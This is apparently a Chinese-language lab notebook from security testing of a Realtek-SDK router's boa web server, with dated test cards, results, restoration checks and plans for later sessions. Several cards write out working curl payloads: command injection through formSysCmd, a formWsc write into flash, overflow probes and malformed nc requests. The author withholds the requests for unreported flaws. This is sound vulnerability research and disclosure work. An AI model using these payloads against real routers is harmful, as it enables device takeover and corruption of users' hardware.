觀測通道 2（先前技術，測試之前就找到）:
      Cisco Talos TALOS-2023-1894 / CVE-2023-41251：同一個 SDK 家族的同一個參數，
      100-byte sprintf 溢位，**沒有 system()**
UART console 當下輸出: 無異常
判定:  P3-1 ❌ 不成立 · P3-4 ✅ 成立（預測就是「不是注入」）· P3-2 ❌ 不成立
反證檢查:
      P3-1 測前寫「注入的命令沒有在回顯通道留下痕跡，且 console 無異常 → 參數在
           到達 system() 之前被過濾或被別的路徑攔下」，實際看到 零封包，
           **而同一 handler 的 localPin 有四個** → 不是「打不到」，是這個參數到不了
      P3-4 測前寫「注入分隔符後有命令執行 → R2 的 6 這個數字漏了 site」，
           實際看到 零封包，與預測一致
      P3-2 測前寫「注入無回顯 → 這條是工具的誤報，BoaGate 的 R2 規則要重寫，
           而且它同時影響另外兩個 build 的結論」，實際看到 零封包，
           **而 Talos 在測試之前就用機制說明了為什麼**
這一步燒掉了什麼: 對照那一發把 HW_WLAN0_WSC_PIN 設成 "1" —— **寫進了 H601**，見 T-31
驗證狀態(測後): dynamic（三項）   下一步: R2 另外四個 site 沒查（PROGRESS 開放 #36）
★ 那一行對照是整張卡的價值。沒有它，「零封包」有兩種解釋而後續完全相反。
```

```text
T-30  P3-7   改用 GET / 換 submit 按鈕名                      22:3x
可行性: ★★★  驗證狀態(測前): unverified   依據: 不同 build 的按鈕名不同
送出（逐字）:
      curl 'http://10.1.1.1/boafrm/formSysCmd?sysCmd=cat%20/etc/version%20%3E%20/var/web/getq.txt%3B%23&submit-url=/syscmd.htm'
      # 四種按鈕名，每一種寫自己的檔名，才歸得了因
      for b in submit-url Apply save none; do … --data-urlencode "$b=/syscmd.htm"; done
原始回應: GET → 302 / 131 B；四種 POST 全部 302
觀測通道 1: /getq.txt → HTTP 302（**檔案沒被建立**）
觀測通道 2: btn-submit-url / btn-Apply / btn-save / btn-none **四個檔全部有內容**，
            而且每一發之後 server 都活著
UART console 當下輸出: 無
判定:  🔶 部分 —— 兩半結果相反
反證檢查: 測前寫下「任何按鈕名都不影響 → 取值不依賴按鈕名，這個變數可以從測試
          矩陣裡拿掉」，實際看到 **四種都執行，連完全不帶都執行** → 那一半被反證。
          GET 那一半與預測一致（translate_uri 先 302，到不了 handleForm）
這一步燒掉了什麼: /var/web 四個檔（ramfs）
驗證狀態(測後): dynamic   下一步: GET 不通 ≠ 沒有 CSRF 面 —— 這台是 stateless Basic，
          瀏覽器會自動重送快取憑證
⚠️ 第一版四種按鈕名共用一個檔名，**歸不了因**（是哪一發寫的？）。改成一發一個檔名重做。
```

```text
T-31  P3-5   第 ⑤ 環：指著 flash 上被改掉的 byte              22:4x–23:2x
可行性: ★★★★★ 驗證狀態(測前): static   依據: W04 讀出 sprintf+system 那一行
送出（逐字，本項已公開為 CVE-2025-3987 / 4462）:
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
        --data-urlencode 'localPin=13572468' --data 'submit-url=/wireless.htm'
原始回應: HTTP 302  in **14.046803s**（本裝置量到最久的合法請求）
觀測通道 1（bootloader 前後各讀 64 KiB）:
      region                     before             after              same
      boot loader 0x0-0x6000     8d305a9afd226084   8d305a9afd226084   same
      H601 0x6000-0x8000         6e2d3233d809ae4c   cf5af09374706898   DIFF
      0x00648a 71->61  0x00648b 71->63  …  0x006491 62->70   (cmp -l 印八進位)
      0x006493 15->25   ← 該區 checksum，裝置自己重算
      before: 99956042      after: 13572468
觀測通道 2（MIB 層）: flash get HW_WLAN0_WSC_PIN → "13572468"
UART console 當下輸出: <RealTek>，讀取全程無異常
判定:  ✅ 成立
反證檢查: 測前寫下「命令沒執行但值有寫進去 → 中間有一層過濾只擋分隔符」，
          實際看到 值寫進去了，而且 T-29 的對照證明分隔符那條路也是通的 →
          沒有那一層過濾
這一步燒掉了什麼: **H601 九個 byte**。已用裝置自己的 MIB 寫入器還原（見 T-37）
驗證狀態(測後): dynamic   下一步: 其他 HW_* id 是不是也這樣寫得進去（開放 #35）
🔴 **plan/W06 §二說這一寫落在 COMPCS。錯的 —— 落在 H601。** 而證據早就在 repo 裡：
   W05 的模擬輸出同一行既印了 0x648a 也印了「H601 checksum」。
   **我在動手前沒有把那兩句話接起來**，所以 T-29 的對照就已經寫進 H601 了。
   H601 裝的是這台的 MAC 與射頻校準，出廠重置不還原。
   我今早才蓋好一個「白名單讓 H601 搆不到」的寫入工具 —— **保護的是工具，不是裝置**。
```

```text
T-32  P10-3  未認證改管理密碼                                23:3x
可行性: ★★★★ 驗證狀態(測前): presumed   依據: formPasswordSetup 是寫入類 handler
送出: **逐字內容依 docs/disclosure.md 保留（D-4，未通報）**；
      handler 與參數見 test-ledger.md 的 P10-3。
      參數名不是抄來的，是從這台自己的 password.htm 抓的：
      Cusername / Cpassword（現行）+ username / newpass / confpass + submit-url
原始回應: HTTP 302
觀測通道 1（三種憑證各打一次 password.htm）:
      baseline  old:200  new:302  none:302
      T1 之後   old:302  new:200  none:302
觀測通道 2: T1 是**完全不帶現行密碼欄位**的那一發 —— T2（帶錯的）與 T3（帶對的）
            行為相同，所以 handler 根本不看那兩欄
UART console 當下輸出: 無
判定:  ✅ 成立，而且是最強的形式（第一發就成立）
反證檢查: 測前寫下「被 301 擋下 → 門的涵蓋範圍不是純 URI 比對」，
          實際看到 302 通過，密碼被換掉
這一步燒掉了什麼: COMPCS 的 USER_NAME / USER_PASSWORD。已還原並雙向驗證
驗證狀態(測後): dynamic   下一步: 逐 handler prior-art，然後才談通報
⚠️ 第一次還原**沒生效**：`flash get` 顯示 USER_NAME 與 USER_PASSWORD **長度都是 0** ——
   那次還原的變數被 WSL 派送剝掉，把使用者名稱也清空了。改用腳本檔重做才成功。
```

```text
T-33  P10-4  把密碼設成空字串 → 全機無認證                    23:4x
可行性: ★★★  驗證狀態(測前): static   依據: 0x0040bd18 的 beq，W04-2 逐指令讀
送出: **逐字內容依 docs/disclosure.md 保留（D-4，未通報）**；見 test-ledger.md P10-4
原始回應: HTTP 302
觀測通道 1（完全不帶 Authorization 標頭）:
      password.htm  200 / 5322 bytes 真實 HTML（baseline 是 302）
      status.htm 200 · home.htm 200 · wlbasic.htm 200 · ddns.htm 200
      wireless.htm 404（那一頁不在 bundle 裡，不是閘門結果）
觀測通道 2（帶錯誤密碼）: password.htm **200** → 比對整段被跳過，不是空對空
UART console 當下輸出: 無
判定:  ✅ 成立
反證檢查: 測前寫下「密碼設成空之後仍然要求認證 → 那個 beq 的語意讀錯了，X-9 撤回」，
          實際看到 每一頁都是 200，X-9 站得住
這一步燒掉了什麼: COMPCS 的 USER_PASSWORD。已還原
驗證狀態(測後): dynamic   下一步: 與 T-32 合起來才是發現 —— D-4 那一列原本寫
          「如果沒有未認證的路徑能把它設成空，這就是一個奇觀」。**那條路存在。**
⚠️ 第一版四個 URL 是用迴圈變數組的，而 WSL 派送會把 $p 剝掉 —— **四個請求全部打在 /**，
   四個 200 差一點變成頭條。用寫死路徑重做才是上面這份。
```

```text
T-34  P4-1 / P4-2 / P4-3 / P4-4  溢位群，以及三次打錯目標      23:5x–00:1x
可行性: ★★★★/★★★★/★★★★★/★★★★★  驗證狀態(測前): other-build ×2 / static ×2
依據: W04 在 V2.1.2 上量到 lastUrl[100] 與其後的兩個旗標
送出（逐字，本項無未通報成分）:
      curl -X POST http://10.1.1.1/boafrm/formNtp --data-urlencode "submit-url=/AAA…"
      curl -X POST http://10.1.1.1/boafrm/formNtp --data 'submit-url='
      curl -X POST http://10.1.1.1/boafrm/formNtp --data 'x=1'          # 缺席
      curl -X POST http://10.1.1.1/boafrm/formWlanSetup --data-urlencode "ifname=BBB…"
原始回應（P4-3 階梯，判準是 Location 回顯了多少）:
      sent    8  HTTP 302  echoed    7 A
      sent  100  HTTP 302  echoed   99 A
      sent  400  HTTP 302  echoed  399 A
      sent  800  HTTP 302  echoed  799 A     ← 完整回顯，100 處沒有截斷
觀測通道 1: 每一發之後 curl -sf http://10.1.1.1/ → 全部 alive
觀測通道 2: 裝置沒有自己重開機（needReboot 沒有被寫到）
UART console 當下輸出: 無
判定:  P4-1 ❌ · P4-2 ❌ · P4-3 ❌ · P4-4 ❌ —— 四項在這個 build 上都不成立
反證檢查:
      P4-1 測前寫「省略參數後 boa 正常回應且服務持續 → 這台的 handler 對缺席參數
           有別的處理，X-2 只適用 2015」，實際看到 200/302 且服務持續
      P4-2 測前寫「空值與缺席的行為相同 → 兩者其實是同一條路徑」，實際看到 相同
      P4-3 測前寫「送 200 bytes 沒有任何可觀測變化 → 這個 .bss 佈局的推論錯了，
           **或這條路徑根本沒被走到**」，實際看到 800 bytes 原樣回顯 →
           **路徑走到了**，所以是前一半：這個 build 不用那個慣用語
      P4-4 測前寫「20 B 那組用 100 B 的長度階梯就能觸發 → 兩組共用緩衝區」，
           實際看到 兩組都沒有可觀測變化
這一步燒掉了什麼: 各 handler 的設定欄位（COMPCS）
驗證狀態(測後): dynamic ×4   下一步: D-2 從候選原創降為「V2.1.2 的發現，如此而已」
⚠️ **三次打錯目標，三次都被自己抓到：**
   1. formWlanRedirect —— 在 root_form[] 裡，**但不在 43 個碰 lastUrl 的函式裡**
   2. formSelLang —— 碰 lastUrl，**但完全不看 submit-url**，永遠跳 countDownPage.htm
   3. curl -X POST 不帶 body → HTTP 400，**測到的是解析器不是缺席的參數**
   第三次才找到 formNtp，而它把 submit-url 回顯進 Location —— **那是正面證人**。
```

```text
T-35  P2-6   HTTP 協定層畸形                                 00:2x
可行性: ★★★  驗證狀態(測前): unverified   依據: Boa 0.94 對 chunked 支援很差
送出（逐字）:
      printf 'GET /\r\n\r\n'                                   | nc 10.1.1.1 80
      printf 'GET / HTTP/9.9\r\nHost: x\r\n\r\n'                | nc 10.1.1.1 80
      printf 'POST /boafrm/formSysCmd HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nsysCm\r\n0\r\n\r\n' | nc 10.1.1.1 80
      printf 'GET /status.htm HTTP/1.1\r\n\r\n'                 | nc 10.1.1.1 80
原始回應:
      0.9 風格   → 裸 <html>，**沒有狀態行**（boa 講 HTTP/0.9）
      HTTP/9.9   → HTTP/1.0 400 Bad Request
      chunked    → HTTP/1.1 400 Bad Request
      無 Host    → HTTP/1.1 200 OK（RFC 2616 要求 400 —— 規格偏差）
觀測通道 1: 每一發之後 server 都 alive
觀測通道 2: 無
UART console 當下輸出: 無
判定:  ✅ 成立（預測就是「回 400 而不是解析錯誤」）
反證檢查: 測前寫下「boa 對所有畸形都正確回 400 → 這條收掉，不用再花時間」，
          實際看到 兩個 400、一個 0.9 裸回應、一個該 400 卻 200 →
          **不是「全部正確回 400」**，所以這條不收掉，但它是規格偏差不是記憶體安全
這一步燒掉了什麼: 無
驗證狀態(測後): dynamic   下一步: 無 Host 卻 200 這一條沒有安全後果，記著就好
```

```text
T-36  —（無登記簿編號）一個未認證請求殺掉 web server          00:3x–00:5x
可行性: —    驗證狀態(測前): 無 —— **這一項不在任何人的清單上**，
             它是從一次 handler 普查裡掉出來的
送出: **逐字內容依 docs/disclosure.md 保留（D-11，未通報）**；
      形狀是一個只帶 submit-url 的合法 POST，handler 名不寫進本檔
原始回應: **HTTP 000 —— curl 連回應都沒收到**
觀測通道 1（乾淨開機之後的對照）:
      formNtp #1  HTTP 302  alive
      formNtp #2  HTTP 302  alive
      formNtp #3  HTTP 302  alive      ← 三發同形狀，全部正常
      目標      HTTP 000  DEAD        ← 第四發
      5 秒後 DEAD ／ 30 秒後 DEAD
觀測通道 2: ping 10.1.1.1 → 1.6 ms 正常。**裝置活著，只有 boa 不見了**
UART console 當下輸出: **一行都沒有**（與 W05 那次一致）
判定:  ✅ 成立（一個請求就夠）
反證檢查: 測前寫下「三發對照裡任何一發也讓 server 消失 → 那就是『開機後第 N 個
          請求』而不是這個 handler」，實際看到 三發全部正常，第四發死
這一步燒掉了什麼: 一次開機循環。**第一次觀察到它是那次開機的第 13 個請求，
          所以那次不足以宣稱** —— 多燒一次開機循環重做才有這張卡
驗證狀態(測後): dynamic   下一步: 它是崩潰還是卡住？哪一種參數形狀觸發？
          W05 那次服務中斷是不是同一個原因？三個都沒量。→ docs/disclosure.md D-11
```

```text
T-37  P10-10 收工還原 + 基準線比對                            01:0x
可行性: ★★★★★ 驗證狀態(測前): none   依據: 本場四份 64 KiB 快照
送出（逐字）:
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
        --data-urlencode 'sysCmd=flash set HW_WLAN0_WSC_PIN 99956042;#' \
        --data 'submit-url=/syscmd.htm'
      python3 -u tools/console-dump.py dump --at-prompt --flash 0x0 --length 0x10000 \
        --ram 0x81000000 --chunk 16384 -o $D/w06-S4-final.bin
原始回應: HTTP 302；dump sha256 450f99361a480500…，4 chunks，0 needed a re-read
觀測通道 1（S2 注入前 vs S4 最後）:
      boot loader   same        H601   same —— **0 個差異 byte**
      COMPDS        DIFF        COMPCS DIFF
      PIN as text   S2: 99956042    S4: 99956042
觀測通道 2（更強的一條）:
      H601 對 **8/16 完整 dump**（這個專案還沒寫過任何東西之前）: **byte-identical**
      COMPCS 只動 2 欄（SYSCMD_SELECT、WPS_FIRST）
      COMPDS 動 25 欄，全部收斂到 COMPCS 的值 = D-10
      USER_PASSWORD **沒有淨變動** ← 密碼還原成功的第三個證據
UART console 當下輸出: <RealTek>，正對照 0b f0 00 04 通過
判定:  ✅ 成立
反證檢查: 測前寫下「出現無法歸因的差異 byte → 有某個測試的副作用沒被記錄，
          回頭找它，不要直接寫回備份把證據蓋掉」，實際看到 **沒有一個無法歸因的 byte**
這一步燒掉了什麼: 本場合計：開機循環 8 次、H601 被寫 3 次（最終逐 byte 還原）、
          COMPDS 還原一次又被本場的 POST 蓋回、管理密碼改 4 次（含一次意外清空
          使用者名稱）最終還原並雙向驗證
驗證狀態(測後): dynamic   下一步: **新基準：COMPCS vs COMPDS 差 0 / 343**
🔴 **程序修正：A2.6 的還原屬於一場的最後，不是開頭。** runsheet Part B 的 B-W06
   寫「開場三件事」，那個順序在這台上是無效的 —— 本場自己的 POST 又把它蓋回去了。
```

## 這一場燒掉了什麼

- 開機循環 **8 次**（第 2 站 4 次、第 3 站 4 次），其中 3 次是 `boa` 被打掛之後的復原。
- `H601` 被寫了 **3 次**（`1` → `99956042` → `13572468` → `99956042`），最終逐 byte 還原。
- `COMPDS` 被還原一次，然後被本場的 POST 蓋回去。
- 管理密碼被改 **4 次**（含一次意外清空使用者名稱），最終還原並雙向驗證。

## 下一場從哪裡開始

1. **G4 第三條**：用**下載得到的** V2.1.2 建 `qemu-env`，跑 `localPin` 那條鏈
   （那一行在 2015 與 2020 完全相同）。桌面工作，不需要裝置。
2. **`D-4` / `D-11` 的逐 handler prior-art 搜尋**，然後才談通報。
3. **開放 #35**：其他 `HW_*` id 是不是也這樣寫得進去 —— MAC 在同一張表裡。

---

# 2026-08-18 — W07 進站場次的**計畫**（寫在動手之前;這一場還沒開始）

> **這一份先進 commit,紀錄卡之後才補。** 這是 `31bcb17`（W05 收工）與
> `a4e3303`（W06）已經走過兩次的順序,而它存在的理由是本檔標頭那一句:
> **append-only + git 讓「寫在前面」可以被 diff 證明。** 下面第三節那五個決定
> 是 2026-08-18 桌面那一場做的,如果它們等到進站當天才寫,diff 就證明不了
> 它們是事先決定的 —— 那條性質一旦失去,補不回來。

**要跑 `A1.1` → `A3.1` → `A3.7` → `A3.13` → `A3.4`（UDP 重掃）→ UPnP →
DNS 身分 → 改設定那批 → 39 個裡的抽樣 → `A3.11` → `P8-4` → `P9-9` → `A4.1`。**
目標:登記簿 W07 目前 11/57,這一場要吃掉需要實機的那三十項左右。

## 這一場之前,桌面上先做完的事（不碰裝置）

**這一段存在的理由跟 W06 那一份一樣:其中一件沒做完,這一場就不該開始。**

| | |
|---|---|
| **十一條反駁條件** | `P6-12` `P8-2` `P8-4` `P8-6` `P8-7` `P8-11` `P8-14` `P8-16` `P8-19` `P9-4`,加上新案 `P9-13`。**`rtcase record` 對沒有反駁條件的案子直接拒收**,而週計畫把這十一條全排進這一場 —— 先進站等於打出一堆照本 repo 自己的規則不可採納的結果。這是登記簿第一次真的擋住人 |
| **`P9-10` 改期到 W08** | 全 W07 唯一不可逆的一項,而這台是這一場其餘三十項的靶。理由是順序不是膽量,寫在 `[schedule].note` 裡 |
| **`A3.13` + `RUNBOOK` §8.12.22** | 新程序 + 「為什麼」,一對一 CI 檢查過 |
| **`$FWRE_WORK/disclosure/D-uninitialised-credential-pair.txt`** | `D-15` 的請求本體,repo 外,mode 600 |
| **`docs/report-draft-2.md`** | 第二份草稿,而它跟第一份的差別是**影響範圍**:第一份的三項綁在一個沒人下載得到的 build 上,這一份在公開映像上成立 |
| **儀器 bug 37 / 38 / 39** | `qemu-env.sh reset` 用 `rm -f` 刪不掉 `serve` 故意建的目錄;`failopen-probe.sh` 第一次跑出七格「什麼都沒發生」因為腳本被當成 ELF;`bin/miniigd` 從解開的樹裡消失,重解還原、三個雜湊相同、**不知道是什麼刪的** |

## 這一場的計畫（動手之前寫的）

| 目標 | 事先寫下的成功條件 |
|---|---|
| `P2-9` | 空使用者名稱 + 空密碼在 `/blank.htm` 回 **200**,而**同一輪**裡錯密碼回 302、無認證回 302、真憑證回 200。四發都要對,少一發不算 |
| `P2-9` 的前提 | `A3.7` 的錯密碼那一列**必須是 302**。若是 200 表示密碼是空的,量到的是 `D-4`,**這一項作廢**,要先把密碼設回非空 |
| `P8-5` | 五個畸形 `Host` 全部 **200**（模擬環境上十七個全過）。任一個回 400 → `vhost_root` 在真機上不是 NULL |
| `D-14` | 被閘門擋住的頁面回 `Location: http://evil.example/login.htm`,而帶 HTML 標記的 `Host` **被編碼**。**這一發預期不會過,而那正是要打它的理由** |
| `P6-4` | UDP 9034 **無回應**,而**同一輪**裡 1900 或 53 有回應當正對照。沒有正對照的「全關」量到的是鏈路不是裝置 |
| `P6-12` | UDP 20005 / 9999 無回應,同一個正對照 |
| `P6-1` | `/upnp/control/WANIPConnection`（**不是** `WANIPConn1`）收得到 `AddPortMapping`,而 `NewInternalClient` 帶 shell 字元後 `/tmp/upnp_info` 或可觀測的副作用出現 |
| `P8-7` | `NewInternalClient` 填 `10.1.1.1` 的映射建得起來,且 WAN 側打得到 |
| `P6-9` | 53/udp 回應版本查詢,而且答得出在聽的是 `dnrd` / `dnsmasq` / `dns_protocl` 哪一支 |
| `P6-10` | 拔掉 WAN 之後 DNS 行為改變,且 `ps` 或埠位看得到 `dnsspoof` |
| 39 個的抽樣 | 挑 3–4 個,`formWsc` 第一個。**單發 + 前後對照**,每一發之前先確認 `boa` 還活著 |
| `P9-9` | reset 之後 `COMPCS` 變回 `COMPDS`,而 **`H601` UNCHANGED** |

## 這一場事先決定、而且要被 diff 證明是事先決定的五件事

1. **`A3.13` 必須排在 `A3.11` 之前,而這是這一場最容易搞砸的一件事。**
   `A3.11.2` 會把管理密碼設成空字串,而那會讓 `A3.13` 量到 `D-4` 不是 `D-15`。
   兩個缺陷產生**一模一樣**的「不帶密碼就進得去」,唯一能分辨的是錯密碼那一列 ——
   而那一列只有在密碼非空時有意義。**順序反了不會報錯,會給你一個看起來正確的答案。**
2. **`P9-9`（reset 鈕）排在全場最後,理由跟危險程度無關。**
   它會把 `COMPCS` 覆寫回 `COMPDS`,所以它跑完之後這一場前面每一項改過的設定
   都不存在了,`P0-5` 的 IoC 基準（4/343）也歸零。**它抹掉的是前面每一項站著的地面。**
3. **`D-15` 的請求不寫進任何 committed 檔案。**
   與 W06 對 `D-1` 的處置同一條規則,但這次更嚴:`D-1` 綁在一個沒人下載得到的
   build 上,**`D-15` 在公開的 V2.1.2 上成立**。請求在 `$FWRE_WORK/disclosure/`,
   `A3.13` 指過去。
   > 而這條規則在 `A3.11.2` 上**沒有**被遵守 —— 那是一個治理缺陷,不是筆誤:
   > 沒有任何工具同時讀 `docs/disclosure.md` 和 `runsheet.md`。記在
   > `docs/disclosure.md § A governance defect`,`A3.13` 是第一節照新做法寫的。
4. **這一場不寄任何東西給 TWCERT/CC,即使 `P2-9` 在矽上成立。**
   `docs/report-draft-2.md` 有**兩個** blocker 不是一個:逐 handler 的 prior-art
   還沒跑,以及實機還沒驗。這一場只解決第二個。**寄出是作者的動作。**
5. **`P4`/`P5` 那九項不在這一場。** 它們是桌面工作,而且應該在進站**之前**做完 ——
   模擬環境裡量到偏移之後,實機只需要驗一次,而不是把整條鏈搬到會斷電的機器上組。
   這一場帶著它們進站等於在最貴的環境裡做最便宜的事。

## 這一場明確不做的

- **不回刷任何韌體。** `P9-10` 已改期 W08,而 `P9-13` 讀出來的東西
  （只驗 16-bit 加總、沒有簽章、沒有 anti-rollback）讓它更值得做、也更該有
  自己的一場,不是塞在三十項後面。
- **不做 `P8-12` 的上傳。** `P8-24` 開了一條不需要 encoder 的路,但那條路要求
  **兩個設定區同時無效**,而這一場結束前每一項都還要用到設定區。
- **不碰無線層。** `P7-*` 全在 W08,缺監聽模式網卡。
- **不把管理介面推上真的網際網路。** `P8-7` 的 WAN 側接的是假 ISP。

## 為什麼順序長這樣

**`A3.13` 排在偵察之前,而那違反第 3 站原本的習慣。**
理由不是它更重要,是**它的成本是零**:三個 GET、不寫任何東西、不用斷電,在一台
完全沒被這一場動過的機器上跑。而它的結論可能推翻 `D-15` —— 如果空憑證在矽上
不成立,那 `docs/report-draft-2.md` 整份要重寫,而那件事越早知道越好。

**UDP 那一輪排在第二,因為它是這一場唯一一個「以前量過但量錯了」的項目。**
`runsheet.md:1740` 用 `nmap -sT` 掃 9034,那是 TCP connect;`P6-4` 講的是
CVE-2021-35394 的 **UDP** daemon,而 W05 的 UDP 清單十個埠裡沒有它。
**TCP RST 對一個 UDP listener 什麼都沒說**,所以那不是重跑,是第一次跑。

**改設定那批排在會 crash 的那批之前**,理由與 W06 相同:`boa` 消失之後每一項
都變成「連不上」,而那跟「端點不存在」長得一模一樣。


---

# 2026-08-18（二）W07 Day 3 —— 這一天完全沒有碰裝置，而它改掉了下一場的計畫

**這一節不是紀錄卡，一張都沒有。** 這一天沒有對裝置送出任何封包、沒有上電、
沒有接序列埠。它出現在這個檔案裡，是因為這個檔案的另一半職責是
**「動手之前寫下的計畫」** —— 而今天的桌面工作改掉了上面那份 W07 進站計畫的
三個地方。**改在進站之前，而且改動本身要能被 diff 看到，這是重點。**

上面那份計畫（`## 這一場的計畫（動手之前寫的）` 起）**不修改，一個字都不改**。
以下是對它的增補，照它原本的編號往下接。

## 一、`A3.13` 的位置不變，但它要量的東西換了說法

原計畫寫「三個 GET、不寫、不斷電，而它可能推翻 `D-15`」。位置照舊，成本照舊，
**但卡片上的預測措辭必須改，因為機制今天被指認了**：

- 那兩個「沒人寫」的緩衝區是 `admin_name` / `admin_password`，來源是
  `MIB_SUPER_NAME`(180) / `MIB_SUPER_PASSWORD`(181)。**三個 build 沒有任何一個
  取過 180 或 181。**
- 開放題 #52 結案：`req->auth_flag` 只被讀兩次，第二次在 `0x0040be2c`
  **任何非零值都跳過整段授權區塊**。所以 2 和 1 等價。

**於是卡片不能再寫「取得比真實憑證更高的權限層級」。** 正確的措辭是
**「整段授權閘門不執行」** —— 那既比較準確，也比較嚴重。
措辭寫錯的代價很具體：實機量到 200 之後，錯的措辭會讓紀錄卡宣稱一件當天沒有
量到的事。

**這一項的反證條件不變**（錯密碼那一列必須是 302），而且**必須在
`A3.11.2` 之前跑**的理由也不變。

## 二、新增一項，而且它現在沒有任何作業單步驟 —— 開機後 601 秒的視窗

今天在 `process_header_end` 讀到閘門的**第三條臂**：以來源 IP 為鍵的 session，
由 `form_formLogin` 寫入 `authipaddr`，過期條件是
`nowuptime - beforeuptime >= 601`。**而 `beforeuptime` 整個 binary 裡沒有任何
地方寫它** —— 兩個獨立工具都這麼說，掃描的控制組在同一輪回報一讀一寫。

所以那個差值就是**系統 uptime**：開機超過十分鐘之後，`authipaddr` 在每一次比對
之前被蓋成 `"0.0.0.0"`，那條臂永遠不成立。而**十分鐘之內它是成立的**。

> **這是這台裝置的一個從來沒有被任何量測描述過的狀態**，而且模擬環境進不去 ——
> `qemu-user` 的 `sysinfo()` 回的是主機的 uptime，任何一台開著的桌機都早就
> 超過 601 秒了。**這件事只有實機能答，而且只有在上電後的頭十分鐘能答。**

**它要進 `A3.2`（冷開機計時），因為那是全場唯一擁有時鐘的一節。** 序列固定：

1. 上電，開始計時；
2. 從主機 A 正常登入一次（這一步會寫 `authipaddr`）；
3. **不帶任何憑證**，從主機 A 取一個被擋的頁面 —— 預期 200；
4. 同一個頁面，從主機 B，同樣不帶憑證 —— 預期 302；
5. 等到 uptime 超過 601 秒，重複第 3 步 —— 預期 302。

**這一項在登記簿裡還沒有列，程序也還不存在**，而且它不能在進站之後補寫。
**下一場的第一件事是把它入冊並凍結，不是插電。**

## 三、抽樣那一格從「39 選 3–4」變成「一個，而且有名字」

原計畫第 3 站 ④ 寫「39 個裡挑 3–4 個，`formWsc` 第一個」。**那個 39 today 被
推翻了。**

`handler-sweep` 報的 39 個死亡是 `qemu-user` 對未對齊存取丟 SIGBUS ——
故障點是 `libapmib.so` 的 `mib_write_to_raw` 裡一道 `sh` 存半字到奇數位址，
而 MIPS Linux 核心會替使用者空間補完。把那個差異補掉之後重跑
（每次探測前完整還原、掃完再驗一次環境）：
**58 個探測、58 次重啟、0 次失敗、57 個活著，死掉的只有 `formSchedule`。**

於是這一格變成兩件事，而第二件是這一場最便宜的一個對照：

- **`formSchedule` 第一個，而且它是唯一的模擬側候選。**
  `D-11` 在實機上量到的正是「一個未認證的合法 POST 讓 web server 不再回來」，
  當時說不出是哪一個。**現在模擬側只剩一個名字，兩邊的形狀和數量對上了。**
- **另外抽 2–3 個原本在那 39 裡、現在活著的 handler**（例如 `formNtp`、
  `formDMZ`），對它們送同樣的一個 POST。
  **預測：它們在矽上會活著**，因為核心會補對齊 —— 這是一個有機制撐著的預測，
  不是硬幣。

> ⚠️ **這一格的反證條件比預測重要**：如果那 2–3 個在實機上也死掉，
> **那對齊那套解釋就是錯的**，而錯的代價不只是這一格 —— 它會讓
> `tools/alignfix` 打開之後量到的每一件事、以及 `bughunt.md` 第 16 列的改寫，
> 全部退回原點。**這是這一場唯一一個會反過來否證一支自家儀器的測試，所以它
> 不准被跳過，也不准跟 `formSchedule` 那一發混在同一張卡上。**

## 四、`P8-3` / `P8-4` 的卡片要引用一條公告，不能寫成發現

今天的 prior-art 搜尋撿到 **CVE-2023-47677（Talos）**：同一顆 SDK 的 `boa`
有 CSRF 缺陷，而且**有**一個「載入 HTML 表單頁之前不讓 API 被呼叫」的防護，
可用 iframe 繞過。

`P8-3` 凍結的預測寫的是「沒有 CSRF token」。**預測不改** —— 凍結的東西不因為
找到前案就改，那正是凍結的意義。**但卡片上必須引用這條公告**，否則結果會被
讀成這個專案的發現。

**而 Talos 描述的機制不是這個 binary 裡的那一個**（這裡是 IP 位址比對加
uptime 過期），兩者是不是同一個功能從外面看的兩種描述，**沒有解決**，
卡片上照這樣寫。

## 五、其餘不變，包含那三個坑

上面那份計畫的三個坑（`A3.13` 必須在 `A3.11` 之前、`P9-9` 排全場最後、
`D-15` 的請求不進 committed 檔案）**全部不變**，而第一個現在有第二個理由：
`A3.13` 之後要留一台**沒有被改過設定**的機器給第二節的 601 秒視窗，
而 `A3.11.2` 會動到密碼。

## 這一天沒有做的，以及為什麼它不算進度

**一項登記簿都沒有關掉。** 桌面那一批（`P1-9`、`P3-8`…`P3-12` 的靜態半邊、
`P5-3`、`P5-7`、`P5-6`）量完了但沒有入冊，因為 `P4`/`P5` 那一批的輸入
（帶 `--alignfix` 的重掃）在收工前最後幾分鐘才落地，來不及跑它餵的那一批。
先記一半會讓同一個下午橫跨兩個 commit。

**而進站那 32 項今天完全沒碰，是刻意的。** 今天長出三個進站前必須先凍結的
新預測，其中第二節那一項連程序都還不存在。**先凍結再進站** —— 不然量到的
結果照這個 repo 自己的規則不可採納，而那正是 Day 2 整場不插電的理由，
今天是同一個理由的第二次。


---

# 2026-08-18（二）W07 Day 4 —— 第二場桌面，而它把進站那一場的作業單從無到有

**這一節不是紀錄卡，一張都沒有。** 沒有對裝置送出任何封包、沒有上電、沒有接序列埠。
它出現在這個檔案裡，是因為這個檔案的另一半職責是**「動手之前寫下的計畫」**——
而今天改掉的不只是預測，是**進站那一場有沒有東西可以照著做**。

> ⚠️ **這一天的檢查器沒有擋住它，而那是設計上的弱點被踩到。**
> `tools/check-benchlog.py` 的配對規則是**比日期**，而 Day 3 已經替 `2026-08-18`
> 留了一筆，所以同一天的第二場對它是隱形的。檔案自己承認這條規則
> 「deliberately weak」。**這一筆是照規則的意思補的，不是照檢查器的結果補的。**

## 一、進站的 32 列，今天早上一列都沒有寫下來的步驟

今天量了一次覆蓋率，數字比「忘了更新」難看得多：

| 週 | 在冊 | 已跑 | 有步驟 | 有豁免 | **缺口** |
|---|---|---|---|---|---|
| W05 | 27 | 27 | 27 | 0 | 0 |
| W06 | 20 | 20 | 18 | 2 | 0 |
| **W07** | **58** | **11** | **2** | 11 | **47** |

**W05 與 W06 是 0，不是因為它們寫得好，是因為它們跑完了。** 舊的檢查只對「已經有
結果」的列要求程序，所以這份作業單**從來沒有在場次之前被寫過，一次都沒有**。

現在補齊了：五節桌面（`A1.5`–`A1.9`）、十一節進站（`A3.14`–`A3.24`），
每一節配一個 `RUNBOOK` §8.12.x，一對一。**進站那 30 列現在每一列都有一節走得到。**

## 二、`A3.2` 前移，而理由是一個十分鐘的窗口

`P2-11`（開機後 601 秒的 IP session 視窗）昨天入冊、今天凍結。它必須在 `A3.2` 裡，
因為那是全場唯一擁有時鐘的一節；而 `A3.2` 因此要**排在偵察前面**，
不然十分鐘的窗口會在還在掃埠的時候過掉。

